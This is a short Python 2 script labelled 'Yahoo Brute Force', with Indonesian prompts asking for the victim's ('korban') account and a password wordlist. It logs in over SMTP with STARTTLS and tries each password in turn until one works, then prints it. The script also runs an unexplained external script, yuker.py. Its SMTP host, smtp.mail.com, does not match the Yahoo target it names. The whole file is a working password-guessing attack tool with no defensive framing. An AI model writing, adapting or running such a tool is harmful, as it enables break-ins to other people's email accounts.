#!/usr/bin/python


import smtplib
import os

os.system("clear")

smtpserver = smtplib.SMTP("smtp.mail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

os.system("python yuker.py")

print "[!] Yahoo Brute Force [!]"

user = raw_input("\nMasukkan Yahoo Korban : ")
passwfile = raw_input("\nMasukkan Wordlist : ")
passwfile = open(passwfile, "r")

for password in passwfile:
		try:
				smtpserver.login(user, password)
		
				print "\n[!] Password Found : %s" % password
				break
		
		except smtplib.SMTPAuthenticationError:
				print "\n[!] Mencoba Password : %s" % password